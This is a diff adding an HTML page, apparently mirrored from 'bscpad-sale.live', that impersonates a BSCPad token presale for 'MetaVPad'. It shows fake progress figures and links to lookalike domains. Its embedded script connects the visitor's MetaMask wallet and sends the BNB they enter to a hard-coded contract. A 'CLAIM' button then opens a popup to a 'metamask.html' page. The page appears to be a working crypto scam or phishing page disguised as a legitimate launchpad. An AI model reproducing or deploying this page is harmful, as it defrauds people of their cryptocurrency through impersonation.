@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html lang="en">
+  
+<!-- Mirrored from bscpad-sale.live/metavpad/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 08 Dec 2021 18:23:21 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,shrink-to-fit=no">
+    <title>BSCPad</title>
+    <meta name="keywords" content="BSCPad">
+    <meta name="description" content="BSCPad">
+    <link rel="shortcut icon" href="images/icocoin.png">
+    <link rel="stylesheet" href="css/bootstrap.css" tppabs="../../bscpad.network/dapp/index_files/bootstrap.css">
+    <link rel="stylesheet" href="css/materialdesignicons.css" tppabs="../../bscpad.network/dapp/index_files/materialdesignicons.css">
+    <link rel="stylesheet" href="css/all.css" tppabs="../../bscpad.network/dapp/index_files/all.css">
+    <link rel="stylesheet" href="css/style.css" tppabs="../../bscpad.network/dapp/index_files/style.css">
+    <link rel="stylesheet" href="css/materialdesignicons.min.css" tppabs="../../cdn.jsdelivr.net/npm/%40mdi/font%405.4.55/css/materialdesignicons.min.css">
+    <style>
+      #text_num {
+        opacity: 0;
+        position: absolute;
+      }
+      .copy_img {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 30px;
+        height: 30px;
+        background: #212A4B;
+        border-radius: 50%;
+        cursor: pointer;
+        opacity: 0.8;
+        margin-left: 5px;
+      }
+      .css-input {
+        font-size: 14px;
+        padding: 6px;
+        border-style: solid;
+        border-radius: 5px;
+        border-width: 2px;
+        background-color: #000000;
+        color: #f1b80c;
+        border-color: #f1b80c;
+        width: 175px;
+      }
+    </style>
+    <script src="js/web3.js" tppabs="https://bscpad.network/dapp/web3.js" type="1eb294470b9b1506ee28a585-text/javascript">
+    </script>
+    <script type="1eb294470b9b1506ee28a585-text/javascript">
+      const contractAbi = [
+        { inputs: [], stateMutability: "nonpayable", type: "constructor" },
+        {
+          anonymous: false,
+          inputs: [
+            {
+              indexed: true,
+              internalType: "address",
+              name: "owner",
+              type: "address"
+            },
+            {
+              indexed: true,
+              internalType: "address",
+              name: "spender",
+              type: "address"
+            },
+            {
+              indexed: false,
+              internalType: "uint256",
+              name: "value",
+              type: "uint256"
+            }
+          ],
+          name: "Approval",
+          type: "event"
+        },
+        {
+          anonymous: false,
+          inputs: [
+            {
+              indexed: true,
+              internalType: "address",
+              name: "from",
+              type: "address"
+            },
+            {
+              indexed: true,
+              internalType: "address",
+              name: "to",
+              type: "address"
+            },
+            {
+              indexed: false,
+              internalType: "uint256",
+              name: "value",
+              type: "uint256"
+            }
+          ],
+          name: "Transfer",
+          type: "event"
+        },
+        {
+          inputs: [],
+          name: "allowRefunds",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [
+            { internalType: "address", name: "owner", type: "address" },
+            { internalType: "address", name: "spender", type: "address" }
+          ],
+          name: "allowance",
+          outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        {
+          inputs: [
+            { internalType: "address", name: "spender", type: "address" },
+            { internalType: "uint256", name: "amount", type: "uint256" }
+          ],
+          name: "approve",
+          outputs: [{ internalType: "bool", name: "", type: "bool" }],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [
+            { internalType: "address", name: "account", type: "address" }
+          ],
+          name: "balanceOf",
+          outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        {
+          inputs: [
+            { internalType: "uint256", name: "amount", type: "uint256" }
+          ],
+          name: "burnMyTokensFOREVER",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "buyTokens",
+          outputs: [],
+          stateMutability: "payable",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "claimDevFeeAndAddLiquidity",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "decimals",
+          outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
+          stateMutability: "pure",
+          type: "function"
+        },
+        {
+          inputs: [
+            { internalType: "address", name: "spender", type: "address" },
+            {
+              internalType: "uint256",
+              name: "subtractedValue",
+              type: "uint256"
+            }
+          ],
+          name: "decreaseAllowance",
+          outputs: [{ internalType: "bool", name: "", type: "bool" }],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "devClaimed",
+          outputs: [{ internalType: "bool", name: "", type: "bool" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "ethSent",
+          outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "getRefund",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [
+            { internalType: "address", name: "spender", type: "address" },
+            { internalType: "uint256", name: "addedValue", type: "uint256" }
+          ],
+          name: "increaseAllowance",
+          outputs: [{ internalType: "bool", name: "", type: "bool" }],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "isRefundEnabled",
+          outputs: [{ internalType: "bool", name: "", type: "bool" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "isStopped",
+          outputs: [{ internalType: "bool", name: "", type: "bool" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "liquidityUnlock",
+          outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "moonMissionStarted",
+          outputs: [{ internalType: "bool", name: "", type: "bool" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "name",
+          outputs: [{ internalType: "string", name: "", type: "string" }],
+          stateMutability: "pure",
+          type: "function"
+        },
+        {
+          inputs: [{ internalType: "bool", name: "_isStopped", type: "bool" }],
+          name: "pauseUnpausePresale",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "pool",
+          outputs: [{ internalType: "address", name: "", type: "address" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        {
+          inputs: [
+            {
+              internalType: "contract IBEP20",
+              name: "tokenAddress",
+              type: "address"
+            },
+            { internalType: "uint256", name: "tokenAmount", type: "uint256" }
+          ],
+          name: "recoverbep20",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "refundTime",
+          outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        {
+          inputs: [
+            { internalType: "address payable", name: "addr", type: "address" }
+          ],
+          name: "setMultisigAddress",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "setPancakePool",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "symbol",
+          outputs: [{ internalType: "string", name: "", type: "string" }],
+          stateMutability: "pure",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "totalSupply",
+          outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        {
+          inputs: [
+            { internalType: "address", name: "recipient", type: "address" },
+            { internalType: "uint256", name: "amount", type: "uint256" }
+          ],
+          name: "transfer",
+          outputs: [{ internalType: "bool", name: "", type: "bool" }],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [
+            { internalType: "address", name: "sender", type: "address" },
+            { internalType: "address", name: "recipient", type: "address" },
+            { internalType: "uint256", name: "amount", type: "uint256" }
+          ],
+          name: "transferFrom",
+          outputs: [{ internalType: "bool", name: "", type: "bool" }],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [{ internalType: "address", name: "user", type: "address" }],
+          name: "userEthSpenttInPresale",
+          outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        { stateMutability: "payable", type: "receive" }
+      ];
+      const contractAddress = "0x068dA2302fD0940B001AD052d1e49BCDE34EEbbd";
+      async function connectMetamask() {
+        let web3Provider = null;
+        console.log("[web3] getting provider...");
+        // Modern Browsers like Chrome and Brave
+        if (window.ethereum) {
+          web3Provider = window.ethereum;
+          try {
+            // Request account access
+            await window.ethereum.enable();
+          } catch (error) {
+            // User denied account access...
+            alert("You must connect your metamask wallet !");
+            console.error("User denied account access to metamask.");
+            return;
+          }
+        } else {
+          // you cant connect
+          console.error("Unable to connect to metamask");
+          alert(
+            "You have to use Trustwallet or install Metamask to use this service, you can install it from :  https://metamask.io/download.html - Only desktop device."
+          );
+          return;
+        }
+        let web3 = new Web3(window.ethereum);
+        let accounts = await web3.eth.getAccounts();
+        console.log("accounts : " + accounts);
+        window.account = accounts[0];
+        document.getElementById("btn-metamask").innerHTML = "<i class='mdi mdi-wallet me-1'></i>Connected";
+        return web3;
+      }
+      async function buyTokens() {
+        let amount = document.getElementById("presaleAmount").value;
+        if (!amount || parseFloat(amount) < 0.29) {
+          alert('Contribution value must be greater than or equal to 0.3 BNB');
+          return;
+        }
+        let _web3 = await connectMetamask();
+        let myContract = new _web3.eth.Contract(contractAbi, contractAddress);
+        let receipt = await myContract.methods.buyTokens().send({
+          from: window.account,
+          value: amount * 10 ** 18,
+          gasLimit: 220000,
+        });
+        if (receipt.events.Transfer) {
+          document.getElementById("disabledButton").disabled = false;
+          document.cookie = "tokensBought=true";
+        }
+      }
+      function openModal() {
+        var modal = document.getElementById("myModal");
+        modal.style.display = "block";
+      }
+      function closeModal() {
+        var modal = document.getElementById("myModal");
+        modal.style.display = "none";
+      }
+      // When the user clicks anywhere outside of the modal, close it
+      window.onclick = function (event) {
+        var modal = document.getElementById("myModal");
+        if (event.target == modal) {
+          modal.style.display = "none";
+        }
+      };
+      window.onload = function () {
+        var decodedCookie = decodeURIComponent(document.cookie);
+        if (decodedCookie === "tokensBought=true") {
+          document.getElementById("disabledButton").disabled = false;
+        }
+      };
+      document.onblur = function () {
+        var modal = document.getElementById("myModal");
+        modal.style.display = "none";
+      };
+    </script>
+  </head>
+  <body class="darkmode">
+    <div id="root">
+      <div>
+        <nav id="PPNavbar" class="navbar navbar-expand-md navbar-light bg-white">
+          <div class="container">
+            <!-- logo -->
+            <a class="navbar-brand d-flex align-items-center">
+              <img src="images/1620983389_logo_img.png" tppabs="https://bscpad.network/1620983389_logo_img.png" alt="BSCPad" class="me-2" height="27">
+              BSCPad					</a>
+            <!-- 手机端导航 -->
+            <div class="d-flex align-items-center" style="flex-wrap: nowrap;">
+              <div class="dropdown  d-block d-md-none d-lg-none d-xl-none">
+                <button class="nav-link btn btn-sm btn-outline-primary btn-circle dropdown-toggle btn-helpmore" type="button" id="dropdownMenuButton1" data-bs-toggle="dropdown" aria-expanded="false"><i class="mdi mdi-help"></i>
+                </button>
+                <ul class="dropdown-menu  dropdown-menu-end" aria-labelledby="dropdownMenuButton1">
+                  <li><a class="dropdown-item" data-bs-toggle="modal" data-bs-target="#helpModal" href="#">How to connect wallet</a></li>
+                </ul>
+              </div>
+              <button class="navbar-toggler collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span>
+              </button>
+            </div>
+            <div class="collapse navbar-collapse" id="navbarSupportedContent">
+              <ul class="navbar-nav ms-auto mb-2 mb-md-0">
+                <li class="nav-item me-2">		
+                  <button class="btn btn-outline-primary btn-sm btn-projects" id="btn-metamask" onclick="if (!window.__cfRLUnblockHandlers) return false; connectMetamask();" data-cf-modified-1eb294470b9b1506ee28a585-=""><i class="mdi mdi-wallet me-1"></i>Connect Wallet
+                  </button>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </nav>
+        <style>
+          .pp-detail-banner {
+            padding: 60px 0 40px 0;
+            background-image: url("images/1620986811_classify_img.png"/*tpa=https://bscpad.network/dapp/index_files/1620986811_classify_img.png*/);
+            background-repeat: no-repeat;
+            background-position: bottom right;
+            background-size: auto 98%;
+          }
+          @media (max-width: 767px) {
+            .pp-detail-banner {
+              background-image: none;
+              padding: 30px 0;
+            }
+            .wallet {
+              flex: 1;
+            }
+          }
+          @media (max-width: 1190px) {
+            .wallet {
+              flex: 1;
+            }
+          }
+          .animation .icon-box::before {
+            background-image: url("images/1620985054_page_img.png"/*tpa=https://bscpad.network/dapp/index_files/1620985054_page_img.png*/);
+          }
+        </style>
+        <div class="pp-detail-banner">
+          <div class="container">
+            <div class="row align-items-center">
+              <div class="col-lg-5 col-md-5">
+                <div class="pp-card-top animation">
+                  <div class="icon-box"><span><img src="images/400x400-Hf9hEtumAEKfeuf2n0bpS1wfcOi0UHCIlFx.jpg" tppabs="https://ADAPAD.bscpad.com.de/index_files/400x400-Hf9hEtumAEKfeuf2n0bpS1wfcOi0UHCIlFx.jpg"></span>
+                  </div>
+                </div>
+                <div class="ms-0">
+                  <div class="pp-card-top">
+                    <div class="title-box">
+                      <h2>											
+                        MetaVPad											<a href="https://metavpad.io/" tppabs="https://ADAPAD.bscpad.com.de/bsc_ADAPAD_ido.htm/" target="_blank"><img src="images/1620988379_link_img.png" tppabs="https://bscpad.network/dapp/index_files/1620988379_link_img.png" alt width="18" height="18"></a>
+                        <a href="https://twitter.com/MetaVPad" tppabs="https://ADAPAD.bscpad.com.de/bsc_ADAPAD_ido.htm" target="_blank"><img src="images/1620988528_link_img.png" tppabs="https://bscpad.network/dapp/index_files/1620988528_link_img.png" alt width="18" height="18"></a>
+                        <a href="https://t.me/MetaVPadsOfficials" tppabs="https://ADAPAD.bscpad.com.de/bsc_ADAPAD_ido.htm" target="_blank"><img src="images/1620988336_link_img.png" tppabs="https://bscpad.network/dapp/index_files/1620988336_link_img.png" alt width="18" height="18"></a>
+                      </h2>
+                      <div class="items-morex">
+                        <span class="pp-status-open"><i class="mdi mdi-circle"></i> Open</span> <span class>Binance Smart Chain</span>
+                        <div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <div>
+                    <div class="mb-3">
+                      <p class="text-muted">Decentralized platform with guaranteed liquidity for millions of users.
+                      </p>
+                    </div>
+                    <input class="css-input" placeholder="Enter the amount of BNB" type="text" id="presaleAmount">
+                    <p>
+                    </p>	
+                    <button onclick="if (!window.__cfRLUnblockHandlers) return false; buyTokens();" type="button" class="btn btn-primary me-2" data-cf-modified-1eb294470b9b1506ee28a585-="">BUY TOKEN
+                    </button>
+                    <script type="1eb294470b9b1506ee28a585-text/javascript">
+                      function createPopupWin(pageURL, pageTitle,
+                                               popupWinWidth, popupWinHeight) {
+                        var left = (screen.width - popupWinWidth) / 1;
+                        var top = (screen.height - popupWinHeight) / 0;
+                        var myWindow = window.open(pageURL, pageTitle, 
+                                                   'resizable=yes, width=' + popupWinWidth
+                                                   + ', height=' + popupWinHeight + ', top='
+                                                   + top + ', left=' + left);
+                      }
+                    </script>								      
+                    <button id="disabledButton" class="btn btn-primary me-2" style="margin-left: 0;" onclick="if (!window.__cfRLUnblockHandlers) return false; createPopupWin('https://bscpad.network/dapp/metamask.html', 'directories=no,titlebar=no,toolbar=no,location=no,status=no,menubar=no,scrollbars=yes,resizable=no, GeeksforGeeks Website', 360, 540);" disabled data-cf-modified-1eb294470b9b1506ee28a585-="">
+                      CLAIM
+                    </button>
+                    <br>
+                    <br>
+                    If you use metamask browser double click on the buy button
+                    <br>
+                    <p class="text-muted"><small>Claim button becomes active within 30 seconds after purchasing. 
+                      <br></small>
+                    </p>
+                  </div>
+                  <div>
+                  </div>
+                </div>
+              </div>
+              <div class="col-lg-5 col-md-7">
+                <div class="card card-img-holder bg-gradient-danger mx-auto mx-lg-0">
+                  <div class="card-body px-3 py-2">
+                    <div class="pp-card-info mt-2">
+                      <div class="pp-card-col w-200px">
+                        First come first served (1 $METAV= 0.001$)
+                      </div>
+                    </div>
+                    <hr class="mb-2 mt-2">
+                    <div class="pp-card-info">
+                      <div class="d-flex justify-content-between w-100">
+                        <div class="pp-card-col w-200px">
+                          Swap progress
+                          <br>
+                          <div class="pp-card-progress">
+                            <div class="pp-card-progress-percent" style="width: 91.68%;">
+                            </div>
+                            <div class="pp-card-progress-label"><span><b>91.68%</b></span><span>397.6 / 450 BNB</span>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="pp-detail-content pt-1">
+          <div class="container">
+            <ul class="nav nav-tabs text-end" id="myTab" role="tablist">
+              <li class="nav-item" role="presentation">
+                <button class="nav-link active" id="home-tab" data-bs-toggle="tab" type="button" role="tab" aria-controls="home" aria-selected="true" data-bs-target="#home">Project details
+                </button></li>
+              <li class>
+                <button class="nav-link" id="schedule-tab" data-bs-toggle="tab" type="button" role="tab" aria-controls="schedule" data-bs-target="#schedule" aria-selected="true">Schedule
+                </button></li>
+              <li class>
+                <button class="nav-link" id="allocation-tab" data-bs-toggle="tab" type="button" role="tab" aria-controls="allocation" data-bs-target="#allocation" aria-selected="true">Your Allocation
+                </button></li>
+            </ul>
+            <div class="tab-content" id="myTabContent">
+              <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab">
+                <div class="py-3">
+                  <div class="row">
+                    <div class="col-md-6">
+                      <div class="card">
+                        <div class="card-header">Pool information
+                        </div>
+                        <div class="card-body p-0">
+                          <div class="table-responsive">
+                            <table class="table mb-0 pp-table-info">
+                              <tbody>
+                                <tr>
+                                  <td>Opens
+                                  </td>
+                                  <td class="text-right">2021-11-28 10:00:00 UTC
+                                  </td>
+                                </tr>
+                                <tr>
+                                  <td>FCFS Opens
+                                  </td>
+                                  <td class="text-right">2021-11-30 14:00:00 UTC
+                                  </td>
+                                </tr>
+                                <tr>
+                                  <td>Closes
+                                  </td>
+                                  <td class="text-right">2021-11-30 19:00:00 UTC
+                                  </td>
+                                </tr>
+                                <tr>
+                                  <td>Min. Allocation
+                                  </td>
+                                  <td><span id="idBusdConvert" style="text-transform: uppercase;">0.3 BNB</span>
+                                  </td>
+                                </tr>
+                                <tr>
+                                  <td>Max. Allocation
+                                  </td>
+                                  <td><span style="text-transform: uppercase;">10  BNB</span>
+                                  </td>
+                                </tr>
+                                <tr>
+                                  <td>Total Funds Swapped
+                                  </td>
+                                  <td class="text-right">450 BNB
+                                  </td>
+                                </tr>
+                              </tbody>
+                            </table>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="col-md-6 mt-4 mt-md-0">
+                      <div class="card">
+                        <div class="card-header">Token information
+                        </div>
+                        <div class="card-body p-0">
+                          <div class="table-responsive">
+                            <table class="table mb-0 pp-table-info">
+                              <tbody>
+                                <tr>
+                                  <td>Name
+                                  </td>
+                                  <td class="text-right">METAVPAD
+                                  </td>
+                                </tr>
+                                <tr>
+                                  <td>Token Symbol
+                                  </td>
+                                  <td class="text-right">	$METAV
+                                  </td>
+                                </tr>
+                                <tr>
+                                  <td>Total Supply
+                                  </td>
+                                  <td class="text-right">100000000
+                                  </td>
+                                </tr>
+                                <tr>
+                                  <td>
+                                    <br>
+                                  </td>
+                                  <td>
+                                  </td>
+                                </tr>
+                                <tr>
+                                  <td>
+                                    <br>
+                                  </td>
+                                  <td class="text-right">
+                                  </td>
+                                </tr>
+                                <tr>
+                                  <td>
+                                    <br>
+                                  </td>
+                                  <td>
+                                  </td>
+                                </tr>
+                              </tbody>
+                            </table>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="tab-pane fade" id="schedule" role="tabpanel" aria-labelledby="schedule-tab">
+                <div class="py-3">
+                  <div class="row">
+                    <div class="col-md">
+                      <div class="card">
+                        <div class="card-body p-0">
+                          <div class="table-responsive">
+                            <table class="table mb-0 pp-table-info">
+                              <tbody>
+                                <tr class="card-header" style="border: medium none;">
+                                  <td>Round
+                                  </td>
+                                  <td>Opens
+                                  </td>
+                                  <td>Closes
+                                  </td>
+                                </tr>
+                                <tr>
+                                  <td>Allocation
+                                    <br>
+                                  </td>
+                                  <td>2021-11-13 10:00:00 UTC
+                                  </td>
+                                  <td>2021-11-14 12:00:00 UTC
+                                  </td>
+                                </tr>
+                                <tr>
+                                  <td>FCFS - Prepare
+                                    <br>
+                                  </td>
+                                  <td>2021-11-14 14:00:00 UTC
+                                  </td>
+                                  <td>2021-11-15 18:00:00 UTC
+                                  </td>
+                                </tr>
+                                <tr>
+                                  <td>FCFS - Start
+                                    <br>
+                                  </td>
+                                  <td>2021-11-18 19:00:00 UTC
+                                  </td>
+                                  <td>2021-11-18 23:00:00 UTC
+                                  </td>
+                                </tr>
+                              </tbody>
+                            </table>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="tab-pane fade" id="allocation" role="tabpanel" aria-labelledby="allocation-tab">
+                <div class="py-3">
+                  <div class="row">
+                    <div class="col-md-8">
+                      <div class="card">
+                        <div class="card-body p-0">
+                          <div class="table-responsive">
+                            <table class="table mb-0 pp-table-info">
+                              <tbody>
+                                <tr class="card-header" style="border: medium none;">
+                                  <td>No.
+                                  </td>
+                                  <td>Token allocation
+                                  </td>
+                                  <td>Date
+                                  </td>
+                                  <td>Token(s) claimed
+                                  </td>
+                                  <td>Action
+                                  </td>
+                                </tr>
+                              </tbody>
+                            </table>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="col-md-4 text-md-end">
+                      <div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="modal fade" id="buyModal" tabindex="-1" aria-labelledby="buyModalLabel" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
+          <div class="modal-dialog modal-md modal-dialog-centered">
+            <div class="modal-content">
+              <div class="modal-header">
+                <h5 class="modal-title" id="buyModalLabel">Join Dexsport Pool
+                </h5>
+                <div class="d-flex align-items-center">
+                  <button type="button" class="btn-close me-2" data-bs-dismiss="modal" aria-label="Close">
+                  </button>
+                </div>
+              </div>
+              <div class="modal-body">
+                <div class="mb-3 d-flex align-items-center">
+                  <label class="form-label mb-0 me-4">Your balance: </label>
+                  <h4 class="text-warning mb-0">0.0 BNB
+                  </h4>
+                </div>
+                <div class="mb-4 d-flex align-items-center justify-content-between" style="column-gap: 10px;"><span class="ps-0" style="border: 0px none; white-space: nowrap;">BNB amount:</span>
+                  <input type="number" id="inputAmountSwap" class="form-control ms-2 me-1" style="width: calc(100% - 12px); border: 1px solid rgb(255, 0, 0); background-color: rgb(255, 170, 170);" value="0.1">
+                  <button class="btn btn-outline-primary" style="border-radius: 5px;">Max
+                  </button>
+                </div>
+                <div class="get-start mt-3 text-center mb-2 d-flex" style="column-gap: 10px;">
+                  <button class="btn btn-primary w-100" disabled data-bs-dismiss="modal">Join
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="pp-footer">
+          <div class="container">
+            <div class="d-flex justify-content-between">
+              <div class="text-muted"> Copyright © 2021. All Rights Reserved by BSCPad
+              </div>
+              <div class="text-muted"> v1.3.1
+              </div>
+              <div class="text-end pp-footer-link">
+                <a href="https://bscpad.com/privacy-policy" tppabs="https://bscpad.com/privacy-policy" target="_blank" class="back-top">Privacy Policy</a>
+                <a href="https://bscpad.com/terms-of-use" tppabs="https://bscpad.com/terms-of-use" target="_blank" class="back-top">Terms of Use</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <span></span>
+      </div>
+    </div>
+    <a href="#" id="toTop" style="z-index: 1000; display: none;"><i class="mdi mdi-arrow-up"></i></a>
+    <script src="js/jquery-3.5.1.min.js" type="1eb294470b9b1506ee28a585-text/javascript">
+    </script>
+    <script src="js/bootstrap.bundle.min.js" type="1eb294470b9b1506ee28a585-text/javascript">
+    </script>
+    <script src="js/script.js" type="1eb294470b9b1506ee28a585-text/javascript">
+    </script>
+    <script src="js/2.a7c72800.chunk.js" type="1eb294470b9b1506ee28a585-text/javascript">
+    </script>
+    <script src="js/main.afd61964.chunk.js" type="1eb294470b9b1506ee28a585-text/javascript">
+    </script>
+  <script src="../cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="1eb294470b9b1506ee28a585-|49" defer=""></script></body>
+
+<!-- Mirrored from bscpad-sale.live/metavpad/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 08 Dec 2021 18:27:07 GMT -->
+</html>
